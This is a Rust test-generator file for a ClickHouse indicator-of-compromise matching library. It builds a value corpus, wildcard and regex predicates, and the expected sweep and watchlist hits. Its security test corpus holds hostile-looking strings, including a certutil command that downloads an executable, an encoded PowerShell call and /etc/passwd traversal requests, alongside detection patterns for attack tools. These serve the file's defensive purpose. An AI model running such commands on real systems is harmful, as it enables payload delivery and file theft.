// SPDX-License-Identifier: Apache-2.0
//! Differential-test generator: emits a corpus, generated ClickHouse SQL and
//! the results `wildcard-core` expects, as JSON on stdout. The runner
//! (`tests/differential/run.py`) executes the SQL in ClickHouse (chDB) and
//! compares. Usage: cargo run -p wildcard-ch --example difftest_gen [seed]

use libwildcard::antalya::{
    SweepItem, SweepOptions, ViewColumns, WatchlistStrategy, byte_gram_index_ddl,
    candidate_predicate, column_predicate, sweep_byte_dispatch, sweep_queries,
    sweep_queries_with_options, watchlist_insert_sql, watchlist_mv, watchlist_plan,
    watchlist_table_ddl,
};
use libwildcard::core::View;
use libwildcard::core::indicator;
use libwildcard::core::verify::{Kind, Matcher};
use serde_json::json;

struct Rng(u64);
impl Rng {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }
    fn pick<T: Copy>(&mut self, v: &[T]) -> T {
        v[(self.next() % v.len() as u64) as usize]
    }
}

fn hex(b: &[u8]) -> String {
    b.iter().map(|x| format!("{x:02X}")).collect()
}

fn byte_dispatch_cases(values: &[Vec<u8>]) -> serde_json::Value {
    let mut values = values.to_vec();
    values.extend([
        b"abc00xabc01x".to_vec(),
        b"\xffabc02x\x00abc03x".to_vec(),
        [vec![b'x'; 8186], b"abc04x".to_vec()].concat(),
        [vec![b'x'; 8187], b"abc05x".to_vec()].concat(),
        [vec![b'x'; 100_000], b"abc06x".to_vec()].concat(),
        b"abc07x\xff".to_vec(),
        "É K".as_bytes().to_vec(),
    ]);
    let mut cases = Vec::new();
    for (name, column, unsupported, filtered) in [
        ("gate", "v", false, false),
        ("source_view", "view", false, true),
        ("source_indicator", "indicator_id", false, false),
        ("helper_collision", "_wc_dispatch0_value", false, false),
        ("unicode_exact_fallback", "v", true, false),
        ("coverage_fallback", "view", true, true),
        ("mixed_fallback", "_wc_dispatch0_value", true, false),
    ] {
        let mut items: Vec<_> = (0..16)
            .map(|i| SweepItem {
                id: if i < 2 { i64::MIN } else { i },
                view: View::Raw,
                regex: format!("abc{i:02}x"),
            })
            .collect();
        items.push(items[0].clone());
        if unsupported {
            for regex in ["(?i)é", "(?i)k", "a|b", ".*"] {
                items.push(SweepItem {
                    id: i64::MAX,
                    view: View::Raw,
                    regex: regex.into(),
                });
            }
        }
        if name == "coverage_fallback" {
            for item in &mut items {
                item.regex = ".*".into();
            }
        }
        if name == "mixed_fallback" {
            for (item, view) in items.iter_mut().zip(View::ALL) {
                item.view = view;
            }
        }
        let filter = filtered.then_some("id % 2 = 0 OR id % 3 = 0 -- trailing comment");
        let plan = sweep_byte_dispatch(
            "bd",
            &["id"],
            &ViewColumns::new(column).unwrap(),
            &items,
            filter,
            SweepOptions::default(),
            None,
        )
        .unwrap();
        assert_eq!(
            plan.fallback.is_some(),
            name == "coverage_fallback" || name == "mixed_fallback",
            "{name}: {:?}",
            plan.fallback
        );
        assert_eq!(plan.index_gate, !unsupported);
        let mut expected = Vec::new();
        for item in &items {
            let matcher = Matcher::regex(&item.regex, item.view, false).unwrap();
            for (id, value) in values.iter().enumerate() {
                if (!filtered || id % 2 == 0 || id % 3 == 0) && matcher.is_match(value) {
                    expected.push(json!([id, item.id, item.view.name()]));
                }
            }
        }
        cases.push(json!({"name": name, "queries": plan.sweep.queries,
            "index_gate": plan.index_gate, "expected": expected,
            "ddl": byte_gram_index_ddl("bd", "byte_grams", column).unwrap()}));
    }
    json!({"values_hex": values.iter().map(|v| hex(v)).collect::<Vec<_>>(), "cases": cases})
}

fn watchlist_join_cases(values: &[Vec<u8>], items: &[SweepItem]) -> serde_json::Value {
    let mut values = values.to_vec();
    values.extend([
        b"aaaaaa".to_vec(),
        b"abcabcabc".to_vec(),
        [vec![b'x'; 253], b"xyz".to_vec()].concat(), // 256 bytes
        [vec![b'x'; 254], b"xyz".to_vec()].concat(), // 257 bytes
        [vec![b'x'; 100_000], b"xyz".to_vec()].concat(),
        b"\xffabc\x00xyz\xfe".to_vec(),
    ]);
    let mut rules = items
        .iter()
        .filter(|i| i.view == View::Raw)
        .cloned()
        .collect::<Vec<_>>();
    for (id, regex) in [
        (900, "evil"),
        (901, "abc"),
        (902, "^aaa.*aaa$"),
        (903, "(?i)é"),
        (904, "xyz"),
    ] {
        rules.push(SweepItem {
            id,
            view: View::Raw,
            regex: regex.into(),
        });
    }
    let mut expected = Vec::new();
    for rule in &rules {
        let matcher = Matcher::regex(&rule.regex, View::Raw, false).unwrap();
        for (id, value) in values.iter().enumerate() {
            if matcher.is_match(value) {
                expected.push(json!([id, rule.id, "raw"]));
            }
        }
    }
    let mut cases = Vec::new();
    for (name, select, hit_columns, oracle_value) in [
        ("plain", vec!["id"], "id UInt32", "js.v"),
        (
            "qualified",
            vec!["js.id", "js.nested.value"],
            "id UInt32, `nested.value` UInt32",
            "js.v",
        ),
        (
            "colliding_names",
            vec!["id", "_wc0_value", "_wc1_key", "gram_key", "regex", "i"],
            "id UInt32, _wc0_value String, _wc1_key String, gram_key String, regex String, i UInt32",
            "js.v",
        ),
        ("empty_projection", vec![], "", "js.v"),
        ("materialized_raw", vec!["id"], "id UInt32", "js.v_alt"),
    ] {
        let mut cols = ViewColumns::new("js.v").unwrap();
        if name == "materialized_raw" {
            cols.materialized.insert(View::Raw, "js.v_alt".into());
        }
        let plan = watchlist_plan(
            "join_mv",
            "js",
            "jh",
            "jw",
            &select,
            &cols,
            &[View::Raw],
            WatchlistStrategy::RuleAnchorJoin,
        )
        .unwrap();
        assert_eq!(plan.strategy, WatchlistStrategy::RuleAnchorJoin);
        let projection = if select.is_empty() {
            String::new()
        } else {
            format!("{}, ", select.join(", "))
        };
        cases.push(json!({"name": name, "mv": plan.sql,
            "hits_ddl": format!("CREATE TABLE jh ({}indicator_id Int64, view String) ENGINE=Memory",
                                if hit_columns.is_empty() { String::new() } else { format!("{hit_columns}, ") }),
            "oracle": format!("SELECT {projection}r.id AS indicator_id, 'raw' AS view FROM js CROSS JOIN \
                               (SELECT * FROM jw FINAL WHERE active = 1 AND view = 'raw') r WHERE match({oracle_value}, r.regex)"),
        }));
    }
    json!({
        "values_hex": values.iter().map(|v| hex(v)).collect::<Vec<_>>(),
        "expected": expected,
        "table_ddl": watchlist_table_ddl("jw").unwrap(),
        "inserts": rules.iter().map(|i| watchlist_insert_sql("jw", i).unwrap()).collect::<Vec<_>>(),
        "cases": cases,
    })
}

const SECURITY: &[&str] = &[
    "Ა",
    "ꭰ",
    "ՠ",
    r"C:\Windows\System32\cmd.exe",
    r"\\Server\Share\Tools\Tool.EXE",
    r"C:\Temp\..\Windows\notepad.exe",
    "abc",
    "abcx",
    "abcy",
    "abc\0def",
    "https://login.evil.com/wp-admin/setup.php",
    "http://LOGIN.EVIL.COM.:8080/%77p-ADMIN/x.PHP?a=1#f",
    "https://user:pass@sub.evil.com:443/path",
    "evil.com",
    "evil.com.",
    "evil.com/path?q",
    "https://evil.com.attacker.net/",
    "http://[2001:db8::1]:8080/x",
    "http://[::1]/",
    "host:notaport",
    "host:",
    "a@b@c.example.org",
    "GET /../../etc/passwd HTTP/1.1",
    "GET /%2e%2e/%2E%2E/etc/passwd",
    "%zz%4%41%",
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.EXE -EncodedCommand SQBFAFgA",
    "cmd.exe /c certutil -urlcache -split -f http://10.0.0.1/a.exe",
    "Mozilla/5.0 (compatible; sqlmap/1.7)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
    "http://10.0.0.1:8080/",
    "110.0.0.12",
    "d41d8cd98f00b204e9800998ecf8427e.bin",
    "mailto:bad@evil.com",
    "https://xn--bcher-kva.example/bücher",
    "line1\nline2",
    "",
    "é",
    "aéb",
    "abcdgh",
    "abefgh",
    "abd",
    "acd",
    "run0.exe",
    "run9.exe",
    "ab0z",
    "xy9z",
    "Kxy",
    "CMD",
    "cd",
    "abababc",
];

// Explicitly exercise the optional gate; mixed IOC sweeps normally disable it.
fn shared_gate_cases(values: &[Vec<u8>]) -> Vec<serde_json::Value> {
    let mut cases = Vec::new();
    for (name, patterns, views, filtered, budget) in [
        (
            "ascii",
            vec!["abc.*x", "abc.*y"],
            vec![View::Raw, View::Raw],
            false,
            0,
        ),
        (
            "anchored",
            vec![r"\Aabc.*x\z", r"\Aabc.*y\z"],
            vec![View::Raw, View::Raw],
            false,
            0,
        ),
        (
            "quote",
            vec!["a'b.*x", "a'b.*y"],
            vec![View::Raw, View::Raw],
            false,
            0,
        ),
        (
            "percent",
            vec!["a%b.*x", "a%b.*y"],
            vec![View::Raw, View::Raw],
            false,
            0,
        ),
        (
            "underscore",
            vec!["a_b.*x", "a_b.*y"],
            vec![View::Raw, View::Raw],
            false,
            0,
        ),
        (
            "backslash",
            vec![r"a\\b.*x", r"a\\b.*y"],
            vec![View::Raw, View::Raw],
            false,
            0,
        ),
        (
            "lower_binary",
            vec!["abc.*x", "abc.*y"],
            vec![View::Lower, View::Lower],
            false,
            0,
        ),
        (
            "decoded_binary",
            vec!["abc.*x", "abc.*y"],
            vec![View::Decoded, View::Decoded],
            false,
            0,
        ),
        (
            "unsupported_or",
            vec!["abc|def", "abc.*x"],
            vec![View::Raw, View::Raw],
            false,
            0,
        ),
        (
            "empty",
            vec!["", "abc.*x"],
            vec![View::Raw, View::Raw],
            false,
            0,
        ),
        (
            "mixed",
            vec!["abc.*x", "abc.*x"],
            vec![View::Raw, View::Lower],
            false,
            0,
        ),
        (
            "filter_or",
            vec!["abc.*x", "abc.*y"],
            vec![View::Raw, View::Raw],
            true,
            0,
        ),
        (
            "byte_fallback",
            vec!["abc.*x", "abc.*y"],
            vec![View::Raw, View::Raw],
            false,
            1,
        ),
        (
            "ast_fallback",
            vec!["abc.*x", "abc.*y"],
            vec![View::Raw, View::Raw],
            false,
            2,
        ),
    ] {
        let items: Vec<_> = patterns
            .iter()
            .zip(views)
            .enumerate()
            .map(|(id, (p, view))| SweepItem {
                id: id as i64,
                view,
                regex: (*p).into(),
            })
            .collect();
        let filter = filtered.then_some("id%2=0 OR id%3=0 -- trailing comment");
        let cols = ViewColumns::new("v").unwrap();
        let mut options = SweepOptions::default();
        let default =
            sweep_queries_with_options("t", &["id"], &cols, &items, filter, options).unwrap();
        let dense = default.queries[0]
            .split("\nWHERE")
            .next()
            .unwrap()
            .to_string();
        if budget == 1 {
            options.max_bytes = dense.len();
        }
        if budget == 2 {
            options.max_ast_nodes = 200;
        }
        let plan =
            sweep_queries_with_options("t", &["id"], &cols, &items, filter, options).unwrap();
        if budget != 0 {
            assert_eq!(plan.queries, vec![dense]);
            assert_eq!(plan.source_scan_count, 1);
        }
        let expect_gate = !matches!(
            name,
            "unsupported_or" | "empty" | "mixed" | "byte_fallback" | "ast_fallback"
        );
        let actual_gate = plan
            .queries
            .iter()
            .any(|q| q.contains("\nWHERE like(") || q.contains("\nWHERE (like("));
        assert_eq!(actual_gate, expect_gate, "{name}");
        let mut expected = Vec::new();
        for (row, value) in values.iter().enumerate() {
            if filtered && row % 2 != 0 && row % 3 != 0 {
                continue;
            }
            for item in &items {
                if Matcher::regex(&item.regex, item.view, false)
                    .unwrap()
                    .is_match(value)
                {
                    expected.push(json!([row, item.id, item.view.name()]));
                }
            }
        }
        cases.push(json!({"name":name,"queries":plan.queries,"expected":expected,"gate_expected":expect_gate,
            "estimated_ast":plan.estimated_ast,"max_ast_nodes":options.max_ast_nodes,"max_bytes":options.max_bytes}));
    }
    cases
}

fn main() {
    let seed: u64 = std::env::args()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(0x5eed);
    let mut r = Rng(seed | 1);
    let tokens: &[&[u8]] = &[
        b"a",
        b"b",
        b"c",
        b"A",
        b"C",
        b".",
        b"/",
        b"\\",
        b"%",
        b"2e",
        b"E",
        b"-",
        b"_",
        b" ",
        b"\n",
        b"\xff",
        "é".as_bytes(),
        b":",
        b"@",
        b"[",
        b"]",
        b"1",
        b"://",
        b"?",
    ];
    let mut values: Vec<Vec<u8>> = SECURITY.iter().map(|s| s.as_bytes().to_vec()).collect();
    values.extend([vec![0xc0, b'a'], vec![b'0', 0x80]]);
    values.extend([
        b"a%b123x".to_vec(),
        b"a_b456y".to_vec(),
        b"\xff\0a%b123x".to_vec(),
        b"\xff\0a_b456y".to_vec(),
        b"aXb123x".to_vec(),
        b"a'b123x".to_vec(),
        b"a'b456y".to_vec(),
        b"a\\b123x".to_vec(),
        b"a\\b456y".to_vec(),
        b"\xff\0a'b123x".to_vec(),
        b"\xff\0a\\b456y".to_vec(),
        b"ABC123X".to_vec(),
        b"AbC456Y".to_vec(),
        b"\xff\0AbC77X".to_vec(),
        b"%61%62%63%31x".to_vec(),
        b"%41BC%00X".to_vec(),
        b"abc123x".to_vec(),
        b"abc456y".to_vec(),
        b"abc\nxxx".to_vec(),
    ]);
    for _ in 0..300 {
        let n = (r.next() % 10) as usize;
        values.push((0..n).flat_map(|_| r.pick(tokens).to_vec()).collect());
    }

    // 1. views
    let views: Vec<_> = View::ALL
        .iter()
        .map(|&v| {
            let expected: Vec<String> = values.iter().map(|x| hex(&v.apply(x))).collect();
            json!({"view": v.name(), "expr": libwildcard::antalya::view_expr("v", v), "expected": expected})
        })
        .collect();

    // 2. predicates
    let mut patterns: Vec<(Kind, String)> = vec![
        (Kind::Wildcard, "*/windows/system32/*.exe".into()),
        (Kind::Wildcard, "//server/share/*".into()),
        (Kind::Wildcard, r"C:\\Windows\\System32\\*".into()),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            "^c:/windows/.*[.]exe$".into(),
        ),
        (Kind::Wildcard, "*/wp-admin/*.php".into()),
        (Kind::Like, "%../%".into()),
        (Kind::Like, "a_b".into()),
        (Kind::Like, "com.evil.%".into()),
        (Kind::Like, "%\\%%".into()),
        (Kind::Like, "%\\_%".into()),
        (Kind::Wildcard, "*?".into()),
        (
            Kind::Regex {
                case_insensitive: true,
            },
            r"powershell(\.exe)?\s+-e(nc|ncodedcommand)?\s".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            r"\b10\.0\.0\.1\b".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            r"^[a-z]+\.evil\.com$".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            r"line1.line2".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            r"\d+\.\d+".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: true,
            },
            "(sqlmap|nikto|nuclei)".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            "a.b".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            "^.$".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            r"\w\W".into(),
        ),
    ];
    let atoms_like = ["a", "b", "c", "A", ".", "%", "_", "e", "2", "é", "/", ":"];
    let atoms_wc = ["a", "b", "C", ".", "*", "?", "e", "é", "/", "@"];
    let atoms_re = [
        "a", "b", "ab", "A", r"\.", "%2e", "[ab]", ".", "(a|bc)", "c?", "a+", "^", "$", r"\w",
        r"\d", r"\s", r"\b", "é", "[^a]", r"\S",
    ];
    for _ in 0..80 {
        let n = 1 + (r.next() % 5) as usize;
        patterns.push((Kind::Like, (0..n).map(|_| r.pick(&atoms_like)).collect()));
        patterns.push((Kind::Wildcard, (0..n).map(|_| r.pick(&atoms_wc)).collect()));
        let ci = r.next().is_multiple_of(2);
        patterns.push((
            Kind::Regex {
                case_insensitive: ci,
            },
            (0..n.min(4)).map(|_| r.pick(&atoms_re)).collect(),
        ));
    }
    for pattern in [
        "ab(cd|ef)gh",
        "a[bc]d",
        "run[0-3][.]exe",
        "^(ab|xy)[0-9]z$",
        "(?i:k)xy",
        "(ab|)cd",
        "[ab]{2,4}c",
    ] {
        for case_insensitive in [false, true] {
            patterns.push((Kind::Regex { case_insensitive }, pattern.into()));
        }
    }
    let cols = ViewColumns::new("v").unwrap();
    let mut preds = Vec::new();
    for (kind, pat) in &patterns {
        for &view in &View::ALL {
            let m = Matcher::new(*kind, pat, view).unwrap();
            let expected: Vec<usize> = values
                .iter()
                .enumerate()
                .filter(|(_, x)| m.is_match(x))
                .map(|(i, _)| i)
                .collect();
            let sql = column_predicate(&cols, *kind, pat, view).unwrap();
            for &id in &expected {
                let grams = libwildcard::core::grams::value_grams(view, &view.apply(&values[id]));
                assert!(
                    m.plan.eval_sorted(&grams),
                    "planner miss: {pat:?}, view {view}, id {id}"
                );
            }
            preds.push(json!({"kind": kind.to_string(), "pattern": pat, "view": view.name(), "sql": sql, "expected": expected}));
            if let Some(candidate) =
                candidate_predicate(&cols.expr(view), *kind, pat, view).unwrap()
            {
                preds.push(json!({"kind": format!("candidate+{}",kind), "pattern": pat, "view": view.name(), "sql": format!("({candidate}) AND ({sql})"), "expected": expected}));
            }
        }
    }

    // 3. sweep and watchlist from indicator specs
    let raw_indicators = [
        "evil[.]com",
        "hxxp://evil.com/wp-admin",
        "10.0.0.1",
        "d41d8cd98f00b204e9800998ecf8427e",
        "bad@evil.com",
        "sqlmap",
        "certutil",
        "bücher.example",
    ];
    let mut items = Vec::new();
    let mut expected_hits = Vec::new();
    for (i, raw) in raw_indicators.iter().enumerate() {
        let s = indicator::spec(raw);
        let id = 100 + i as i64;
        let m = Matcher::regex(&s.regex, s.view, false).unwrap();
        for (row, v) in values.iter().enumerate() {
            if m.is_match(v) {
                expected_hits.push(json!([row, id, s.view.name()]));
            }
        }
        items.push(SweepItem {
            id,
            view: s.view,
            regex: s.regex,
        });
    }
    // Unicode folds newer than the candidate engine must still reach RE2.
    for (id, regex) in [
        (200, "(?i)ა"),
        (201, "(?i)Ꭰ"),
        (202, r"\ba"),
        (203, r"\B"),
        (204, r"\p{L}"),
        (205, "evil"),
        (206, "evil|cmd"),
        // Literal NUL patterns are truncated by older native engines; the
        // escaped spelling keeps this binary-value test portable.
        (207, r"\x00"),
        (208, r"\Aabc\z"),
        (209, r"\AC:\\Windows\\System32\\cmd\.exe\z"),
        (210, r"^abc.*def$"),
    ] {
        let m = Matcher::regex(regex, View::Raw, false).unwrap();
        for (row, value) in values.iter().enumerate() {
            if m.is_match(value) {
                expected_hits.push(json!([row, id, "raw"]));
            }
        }
        items.push(SweepItem {
            id,
            view: View::Raw,
            regex: regex.into(),
        });
    }
    let sweeps = sweep_queries("t", &["id"], &cols, &items, None, 200_000).unwrap();
    let watch_inserts: Vec<_> = items
        .iter()
        .map(|i| watchlist_insert_sql("watch", i).unwrap())
        .collect();
    let watch_items: Vec<_> = items
        .iter()
        .map(|i| json!([i.id, i.view.name(), i.regex]))
        .collect();
    let mv = watchlist_mv("wc_mv", "src", "hits", "watch", &["id"], &cols, &View::ALL).unwrap();

    let out = json!({
        "values_hex": values.iter().map(|v| hex(v)).collect::<Vec<_>>(),
        "views": views,
        "predicates": preds,
        "sweep": {"queries": sweeps, "expected": expected_hits},
        "shared_gate_cases": shared_gate_cases(&values),
        "byte_dispatch": byte_dispatch_cases(&values),
        "watchlist_join": watchlist_join_cases(&values, &items),
        "watchlist": {"table_ddl": watchlist_table_ddl("watch").unwrap(), "items": watch_items, "inserts": watch_inserts, "mv": mv},
    });
    println!("{out}");
}
